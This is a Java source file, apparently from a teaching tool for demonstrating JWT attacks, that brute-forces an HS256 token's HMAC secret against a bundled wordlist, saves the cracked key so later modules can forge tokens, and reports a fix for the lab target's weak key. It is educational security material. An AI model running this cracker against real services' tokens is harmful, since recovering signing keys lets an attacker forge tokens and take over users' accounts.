package rs.raf.bvs.jwttool.attacks;

import rs.raf.bvs.jwttool.jwt.JwtCodec;
import rs.raf.bvs.jwttool.jwt.JwtParts;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

// an HMAC JWT is only as strong as its secret
// the target app uses HMAC256("secret"), a wordlist cracks it in a few ms
public final class A3_BruteForceSecret implements Attack {

    @Override
    public AttackResult run(AttackContext ctx) throws Exception {
        AttackResult r = new AttackResult("Attack 3 - Brute Force Secret");

        if (ctx.getToken() == null) {
            r.fail("No token.");
            return r;
        }

        JwtParts parts = JwtCodec.split(ctx.getToken());
        byte[] targetSig = parts.signatureBytes();
        String signingInput = parts.signingInput();

        // brute force only makes sense for HS256, it does not work for RS256 and others
        String alg = parts.header.optString("alg", "");
        if (!"HS256".equalsIgnoreCase(alg)) {
            r.warn("Algorithm is not HS256 (it is " + alg + ") - HMAC brute force does not apply.");
            return r;
        }

        List<String> wordlist = loadBundledWordlist();
        r.info("Loading bundled wordlist (" + wordlist.size() + " candidates).");
        r.info("Algorithm: HS256 (HMAC-SHA256)");
        r.info("Strategy: for each candidate, compute HMAC(header.payload, candidate) and compare with the target signature.");

        // measure time to show how fast it is
        long start = System.currentTimeMillis();
        long tried = 0;
        String found = null;
        List<String> sample = new ArrayList<>();

        for (int i = 0; i < wordlist.size(); i++) {
            String candidate = wordlist.get(i);
            if (candidate == null || candidate.isEmpty()) {
                continue;
            }
            tried++;
            if (sample.size() < 5) {
                sample.add(candidate);
            }
            byte[] sig = JwtCodec.hmacSha256(candidate, signingInput);
            // if the candidate HMAC matches the signature -> we found the key
            if (Arrays.equals(sig, targetSig)) {
                found = candidate;
                break;
            }
        }

        long elapsedMs = System.currentTimeMillis() - start;

        r.info("First 5 candidates: " + String.join(", ", sample) + " ...");
        r.info("Candidates tried: " + tried);
        r.info("Time: " + elapsedMs + " ms");

        if (found != null) {
            // store the secret in ctx so A5 and A6 can reuse it
            ctx.setSecret(found);
            r.ok("Secret found: \"" + found + "\"");
            r.code("Cracked secret", found);
            r.warn("You can now forge ANY token (see Attack 6).");
            r.setConclusion("The target app uses HMAC256(\"secret\") in UserService.java:29. Fix: a random >=256-bit key from an environment variable.");
            r.setSuccess(true);
        } else {
            r.fail("Secret not found in the bundled wordlist.");
            r.setSuccess(false);
        }

        return r;
    }

    private static List<String> loadBundledWordlist() {
        InputStream is = A3_BruteForceSecret.class.getResourceAsStream("/wordlists/common-secrets.txt");
        // if the wordlist is not in the JAR, a small fallback
        if (is == null) {
            return new ArrayList<>(Arrays.asList("secret", "password", "12345", "admin"));
        }
        List<String> out = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (!line.isEmpty()) {
                    out.add(line);
                }
            }
        } catch (Exception e) {
            // if reading fails, continue with what we have
        }
        return out;
    }
}
